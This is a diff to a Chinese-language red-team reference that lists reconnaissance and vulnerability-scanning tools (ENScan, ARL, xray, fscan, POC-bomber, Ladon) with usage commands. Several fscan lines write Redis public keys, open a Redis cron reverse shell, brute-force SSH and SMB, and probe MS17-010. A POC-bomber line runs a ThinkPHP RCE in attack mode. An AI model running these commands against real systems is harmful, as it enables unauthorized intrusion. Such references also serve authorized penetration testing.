@@ -4,11 +4,6 @@
 目标信息
 ----------------------------------------
 
-资产搜集
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- ENScan
-	+ 项目地址：``https://github.com/wgpsec/ENScan_GO``
-
 CDN判别
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - 在线多地超级ping
@@ -26,28 +21,6 @@ CDN判别
 		
 			echo hackerone.com| cdncheck -resp
 			subfinder -d hackerone.com| cdncheck -resp
-
-子域爆破
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `ESD <https://github.com/FeeiCN/ESD>`_
-	| ``pip install esd``
-	| ``esd -d baidu.com``
-- `subDomainsBrute <https://github.com/lijiejie/subDomainsBrute>`_
-	| ``python3 subDomainsBrute.py baidu.com``
-- `broDomain <https://github.com/code-scan/BroDomain>`_
-	+ 查询域名注册邮箱,查询备案号
-	+ 通过备案号查询域名,反查注册邮箱,注册人
-	+ 通过注册人查询到的域名在查询邮箱
-	+ 通过上一步邮箱去查询域名
-	+ 查询以上获取出的域名的子域名
-- `aiodnsbrute <https://github.com/blark/aiodnsbrute>`_
-	| ``pip install aiodnsbrute``
-	| ``aiodnsbrute -w wordlist.txt -vv -t 1024 domain.com``
-- `OneForAll <https://github.com/shmilylty/OneForAll>`_
-- `subfinder <https://github.com/subfinder/subfinder>`_
-	| ``subfinder -d yuanqisousou.com/``
-- `wydomain <https://github.com/ring04h/wydomain>`_
-- `chaos <https://github.com/projectdiscovery/chaos-client>`_
 
 主机信息
 ----------------------------------------
@@ -212,15 +185,186 @@ Samba服务
 web系统
 ----------------------------------------
 
-web指纹识别
+资产搜集
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `Wappalyzer <https://github.com/AliasIO/Wappalyzer>`_
-- `CMS指纹识别 <https://github.com/n4xh4ck5/CMSsc4n>`_
-- `云悉指纹 <https://www.yunsee.cn/>`_
-- `whatweb <https://github.com/urbanadventurer/whatweb>`_
-- `Webfinger <https://github.com/se55i0n/Webfinger>`_
-- `CMSeek <https://github.com/Tuhinshubhra/CMSeeK>`_
-- `EHole <https://github.com/EdgeSecurityTeam/EHole>`_ 红队重点攻击系统指纹探测工具
+- ENScan
+	+ 项目地址：``https://github.com/wgpsec/ENScan_GO``
+	+ 默认公司：``./enscan -n 小米``
+	+ 批量查询：``./enscan -f f.txt``
+	+ 对外投资占股100%的公司：``./enscan -n 小米 -invest 100``
+
+互联网信息收集
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ ARL 资产侦察灯塔系统
+	::
+
+		git clone https://github.com/TophantTechnology/ARL
+		cd ARL/docker/
+		docker volume create arl_db
+		docker-compose pull
+		docker-compose up -d 
+		
+		默认端口5003 (https), 默认用户名密码admin/arlpass
++ ShuiZe_0x727
+	- 项目：``https://github.com/0x727/ShuiZe_0x727``
+	- 协助红队人员快速的信息收集，测绘目标资产，寻找薄弱点。
+	- 全方位收集相关资产，并检测漏洞。也可以输入多个域名、C段IP等。
++ EHole 
+	- 项目地址：``https://github.com/EdgeSecurityTeam/EHole``
++ BBScan
+	- 项目地址：https://github.com/lijiejie/BBScan
+	- Web漏洞扫描工具，快速发现并定位可能存在弱点的目标
+	- 扫描主机(包含C段):  ``python3 BBScan.py --host www.a.com --network 24``
+	- 文件扫描：``python3 BBScan.py -f wandoujia.com.txt``
+	- 目录扫描：``python3 BBScan.py -d targets/``
++ P1finger
+	- 项目地址：https://github.com/P001water/P1finger
+	- 红队行动下的重点 **资产指纹** 识别工具
+	- 基于本地规则库的 Web 资产指纹识别
+		::
+		
+			P1finger -u [target]
+			P1finger -uf [target file] // -uf 指定url文件
+	- 基于Fofa测绘系统的 Web 指纹识别
+		::
+		
+			首次运行生成 p1fingerConf.yaml 配置文件,配置fofa的email和apikey
+			P1finger -m fofa -u [target]
+			P1finger -m fofa -uf [target file] -o file.xlsx // file.xlsx可自定义文件名
+	- 代理模式
+		::
+		
+			P1finger.exe -uf urls.txt -httpproxy 127.0.0.1:4781
+			P1finger.exe -uf urls.txt -socks 127.0.0.1:4781
+
+互联网漏洞扫描
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ xray【web】
+	- 全局配置
+		+ --config 用于指定配置文件的位置，默认加载同目录的 config.yaml
+		+ --log_level 用于指定全局的日志配置
+		+ ``xray_windows_amd64.exe --log_level debug --config 1.yaml webscan --url xxx``
+	- reverse命令
+		+ 启用单独的盲打平台服务，盲打平台用于处理没有回显或延迟触发的问题
+	- genca
+		+ 用于快速生成一个根证书，主要用于被动代理扫描 HTTPS 流量时用到
+	- subdomain
+		+ 子域名扫描
+		+ ``xray_windows_amd64.exe  subdomain --target example.com --text-output example.txt``
+		+ ``xray_windows_amd64.exe subdomain --target example.com --console-ui --text-output example.txt``
+	- webscan
+		+ 扫描web漏洞，核心功能
+		+ --plugins 配置本次扫描启用哪些插件, 不再使用配置文件中的配置
+			- ``--plugins xss --plugins xss,sqldet,phantasm``
+		+ --poc 配置本次扫描启用哪些 POC,因为所有 POC 隶属于 phantasm 插件, 所以该参数其实是 phantasm 插件独有的配置。
+			- ``--plugins phantasm --poc poc-yaml-thinkphp5-controller-rce``
+			- ``--plugins phantasm --poc "*thinkphp*"``
+			- ``--plugins phantasm --poc "/home/test/pocs/*"``
+			- ``--plugins phantasm --poc "/home/test/pocs/*thinkphp*" ...``
+		+ 配置输入来源
+			- --listen 
+				+ 启动一个被动代理服务器作为输入，如 --listen 127.0.0.1:4444，然后配置浏览器或其他访问工具的 http 代理为 http://127.0.0.1:4444 就可以自动检测代理中的 HTTP 请求并进行漏洞扫描
+			- --basic-crawler 
+				+ 启用一个基础爬虫作为输入， 如 --basic-crawler http://example.com，就可抓取 http://example.com 的内容并以此内容进行漏洞扫描
+			- --url 
+				+ 用于快速测试单个 url，这个参数不带爬虫，只对当前链接进行测试。默认为 GET 请求，配合下面的 --data 参数可以指定 body，同时变为 POST 请求。
+			- -uf
+				+ 从文件加载url
+			- --raw-request 
+				+ 用于加载一个原始的 HTTP 请求并用于扫描，原始请求类似上面代码框中的原始请求，如果你用过 sqlmap -r，那么这个参数应该也很容易上手。
+		+ 输出方式
+			- --html-output 将结果输出为 html 报告, 报告样例
+			- --webhook-output 将结果发送到一个地址
+			- --json-output 将结果输出到一个 json 文件中
+		+ 示例
+			- ``xray_darwin_amd64 webscan --plugins xss --listen 127.0.0.1:1111 --html-output 1.html``
+			- ``xray_darwin_amd64 --log_level debug webscan --plugins xss,cmd_injection --basic-crawler http://example.com --json-output 1.json``
+			- ``xray_darwin_amd64 webscan --url http://example.com --data "x=y" --html-output 2.html --json-output 1.json``
+			- ``xray_darwin_amd64 webscan --url http://example.com/ --webhook-output http://host:port/path``
++ afrog
+	- 项目地址：``https://github.com/zan8in/afrog``
+	- 需要配置 ceye.io的key
+	- ``afrog -t http://127.0.0.1 -config config.yaml -o 1.html``
+	- ``afrog -T result.txt -config config.yaml -o 1.html``
++ poc
+	- 项目地址：``https://github.com/tr0uble-mAker/POC-bomber``
+	- 验证模式：``python3 pocbomber.py -u http://xxx.xxx``
+	- 攻击模式：``python3 pocbomber.py -u http://xxx.xxx --poc="thinkphp2_rce.py" --attack``
+	- -f :指定目标url文件(这里有bug，文件中的url必须http(s)://开头)
+
+内网信息收集
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 带带弟弟
+	- 项目：``https://github.com/SleepingBag945/dddd``
+	- 示例：
+		::
+		
+			# 指定IP禁Ping全端口扫描指定端口
+			./dddd -t 172.16.100.1 -p 80,53,1433-5000 -Pn
+			先配置./config/subfinder-config.yaml中的FOFA 邮箱和KEY。
+				fofa: ["xxxx@qq.com:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
+			./dddd -t "domain=\"baidu.com\"" -fofa (从fofa取100个baidu.com域名的目标)
+			./dddd -t "domain=\"baidu.com\"" -fofa -ffmc 10000 (指定最大数量为10000 默认100)
++ fscan
+	- 项目地址：``https://github.com/shadow1ng/fscan``
+	- 示例
+		::
+		
+			fscan.exe -h 192.168.1.1/24  (默认使用全部模块)  
+			fscan.exe -h 192.168.1.1/16  (B段扫描)
+			fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)  
+			fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)  
+			fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)  
+			fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)  
+			fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)  
+			fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)  
+			fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)   
+			fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )  
+			fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)  
+			fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)  
+			fscan64.exe -h 10.10.180.0-10.10.180.255 -p 445 -sc ms17|findstr "MS17-010"（指定模块）
+			fscan.exe -hf ip.txt  (以文件导入)
++ Template 
+	+ 项目地址：https://github.com/1n7erface/Template
++ Milkyway
+	+ 项目地址：https://github.com/polite-007/Milkyway
+	+ ``milkyway_windows_amd64.exe -f 1.txt -m -c 100``
+	+ ``milkyway_windows_amd64.exe -u www.baidu.com -m -c 100``
++ goon
+	- 项目地址：``https://github.com/i11us0ry/goon``
+	- goon,集合了fscan和kscan等优秀工具功能的扫描爆破工具。
+	- 功能包含：ip探活、port扫描、web指纹扫描、title扫描、fofa获取、ms17010、mssql、mysql、postgres、redis、ssh、smb、rdp、telnet等爆破以及如netbios探测等功能。
++ SweetBabyScan
+	- 项目地址：``https://github.com/inbug-team/SweetBabyScan``
+	- 轻量级内网资产探测漏洞扫描工具，支持弱口令爆破的内网资产探测漏洞扫描工具，集成了Xray与Nuclei的Poc
++ Ladon
+	- 项目地址：``https://github.com/k8gege/Ladon``
+	- 大型内网渗透扫描器\域渗透\横向工具，PowerShell模块、Cobalt Strike插件、内存加载、无文件扫描。内含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。
+
+子域爆破
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- `ESD <https://github.com/FeeiCN/ESD>`_
+	| ``pip install esd``
+	| ``esd -d baidu.com``
+- `subDomainsBrute <https://github.com/lijiejie/subDomainsBrute>`_
+	| ``python3 subDomainsBrute.py baidu.com``
+- `broDomain <https://github.com/code-scan/BroDomain>`_
+	+ 查询域名注册邮箱,查询备案号
+	+ 通过备案号查询域名,反查注册邮箱,注册人
+	+ 通过注册人查询到的域名在查询邮箱
+	+ 通过上一步邮箱去查询域名
+	+ 查询以上获取出的域名的子域名
+- `aiodnsbrute <https://github.com/blark/aiodnsbrute>`_
+	| ``pip install aiodnsbrute``
+	| ``aiodnsbrute -w wordlist.txt -vv -t 1024 domain.com``
+- OneForAll
+	+ 项目地址：``https://github.com/shmilylty/OneForAll``
+	+ ``python3 oneforall.py --target baidu.com run``
+	+ ``python3 oneforall.py --targets ./domains.txt run``
+- `subfinder <https://github.com/subfinder/subfinder>`_
+	| ``subfinder -d yuanqisousou.com/``
+- `wydomain <https://github.com/ring04h/wydomain>`_
+- `chaos <https://github.com/projectdiscovery/chaos-client>`_
 
 Waf指纹
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
